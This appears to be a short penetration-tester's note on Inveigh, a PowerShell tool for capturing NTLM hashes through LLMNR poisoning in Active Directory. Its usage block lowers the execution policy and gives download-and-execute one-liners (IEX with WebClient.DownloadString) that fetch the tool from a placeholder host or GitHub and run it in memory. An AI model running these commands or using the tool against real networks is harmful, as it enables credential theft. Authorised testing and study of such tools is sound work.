---
tags:
  - tool
  - AD
date: 2023-09-1
---

- Inveigh is a tool similiar to [[Responder]] that allows you to capture [[NTLM]] hashes using [[LLMNR Poisoning]] BUT it does not *really* support SMB relay like responder does.

# Usage
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
Import-Module ./Inveigh.psd1

# Or, to execute in memory
IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")

# OR

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psd1")
```




